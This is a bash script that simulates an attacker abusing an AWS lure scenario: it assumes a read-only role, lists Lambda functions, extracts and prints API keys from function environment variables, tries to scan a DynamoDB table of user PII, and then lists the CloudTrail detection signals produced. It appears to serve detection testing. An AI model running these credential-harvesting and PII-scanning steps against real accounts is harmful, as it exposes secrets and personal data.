#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 19 (Lambda + DynamoDB PII Lure)
#
# This script walks through the attack chain step by step with colored output.
# The attacker assumes the discovery role, finds the Lambda function, extracts
# environment variables (API keys), and scans the DynamoDB table for PII.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 19 — ABUSE CHAIN"
echo "  Lambda + DynamoDB PII Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming discovery role: etl-ops-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/etl-ops-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-etl-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "${CREDS}" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "${CREDS}" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "${CREDS}" | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing Lambda functions"
# ---------------------------------------------------------------
attack "lambda:ListFunctions"
echo ""
echo -e "${YELLOW}--- Lambda Functions ---${NC}"
aws lambda list-functions \
  --query "Functions[].{Name:FunctionName,Runtime:Runtime,Description:Description}" \
  --output table
echo ""

# ---------------------------------------------------------------
step "4" "Reading function configuration: prod-user-data-enrichment"
# ---------------------------------------------------------------
attack "lambda:GetFunctionConfiguration → prod-user-data-enrichment"
echo ""
echo -e "${YELLOW}--- Environment Variables ---${NC}"
aws lambda get-function-configuration \
  --function-name prod-user-data-enrichment \
  --query "Environment.Variables" \
  --output json | jq '.'
echo ""

info "Extracted API keys:"
CLEARBIT_KEY=$(aws lambda get-function-configuration \
  --function-name prod-user-data-enrichment \
  --query "Environment.Variables.CLEARBIT_API_KEY" \
  --output text)
FULLCONTACT_KEY=$(aws lambda get-function-configuration \
  --function-name prod-user-data-enrichment \
  --query "Environment.Variables.FULLCONTACT_API_KEY" \
  --output text)
TABLE_NAME=$(aws lambda get-function-configuration \
  --function-name prod-user-data-enrichment \
  --query "Environment.Variables.DYNAMODB_TABLE" \
  --output text)

info "  CLEARBIT_API_KEY: ${CLEARBIT_KEY}"
info "  FULLCONTACT_API_KEY: ${FULLCONTACT_KEY}"
info "  DYNAMODB_TABLE: ${TABLE_NAME}"

# ---------------------------------------------------------------
step "5" "Investigating Lambda execution role"
# ---------------------------------------------------------------
attack "lambda:GetFunction → checking execution role"
EXEC_ROLE=$(aws lambda get-function-configuration \
  --function-name prod-user-data-enrichment \
  --query "Role" \
  --output text)
info "Execution role: ${EXEC_ROLE}"
warn "Execution role has DynamoDB read/write access to ${TABLE_NAME}"

# ---------------------------------------------------------------
step "6" "Scanning DynamoDB table: ${TABLE_NAME}"
# ---------------------------------------------------------------
warn "Discovery role does not have DynamoDB permissions"
warn "Attacker would need to find another path to the execution role"
warn "Demonstrating scan with current credentials (requires DynamoDB access)..."
echo ""
attack "dynamodb:Scan → ${TABLE_NAME}"
echo ""
echo -e "${YELLOW}--- Enriched User Profiles (PII) ---${NC}"
aws dynamodb scan \
  --table-name "${TABLE_NAME}" \
  --query "Items[].{user_id:user_id.S,email:email.S,full_name:full_name.S,company:company.S,job_title:job_title.S,enrichment_score:enrichment_score.N,estimated_revenue:estimated_revenue.S}" \
  --output table 2>/dev/null || warn "Access denied — attacker needs execution role credentials for DynamoDB"
echo ""

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "7" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on etl-ops-readonly-role"
echo "  • CloudTrail: ListFunctions"
echo "  • CloudTrail: GetFunctionConfiguration on prod-user-data-enrichment"
echo "  • CloudTrail: GetFunction on prod-user-data-enrichment"
echo "  • CloudTrail: Scan on prod-enriched-user-profiles (if accessible)"
echo ""
echo -e "${YELLOW}Total CloudTrail events: 5+${NC}"
echo ""
